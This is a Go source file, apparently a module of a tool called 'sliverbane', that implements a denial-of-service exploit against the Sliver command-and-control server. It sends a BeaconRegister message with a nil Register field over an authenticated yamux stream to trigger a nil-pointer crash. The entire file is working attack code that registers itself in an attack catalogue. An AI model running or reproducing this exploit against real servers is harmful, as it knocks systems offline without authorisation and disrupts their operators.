package dos

import (
	"fmt"
	"sliverbane/internal/protocol"
	"sliverbane/protobuf/sliverpb"

	"github.com/hashicorp/yamux"
	"google.golang.org/protobuf/proto"
)

type NilBeaconRegisterAttack struct{}

func (n *NilBeaconRegisterAttack) Name() string {
	return "nil-beacon-reg"
}

func (n *NilBeaconRegisterAttack) Description() string {
	return "Crashes Sliver Server via Nil-Pointer Dereference in BeaconRegister (CWE-476)"
}

const MsgBeaconRegister = uint32(70) // From Sliver source

func (n *NilBeaconRegisterAttack) Execute(session *yamux.Session, envKey *protocol.EnvelopeKey) error {
	stream, err := session.Open()
	if err != nil {
		return fmt.Errorf("failed to open yamux stream: %w", err)
	}
	defer stream.Close()

	// Malicious payload: Register is nil
	maliciousBeaconReg := &sliverpb.BeaconRegister{
		ID:       "11111111-2222-3333-4444-555555555555",
		Interval: 60,
		Register: nil, // Trigger
	}

	maliciousData, err := proto.Marshal(maliciousBeaconReg)
	if err != nil {
		return fmt.Errorf("marshal failed: %v", err)
	}

	env := &sliverpb.Envelope{
		ID:   0,
		Type: MsgBeaconRegister,
		Data: maliciousData,
	}

	return protocol.WriteEnvelope(stream, env, envKey)
}

func init() {
	Register(&NilBeaconRegisterAttack{})
}
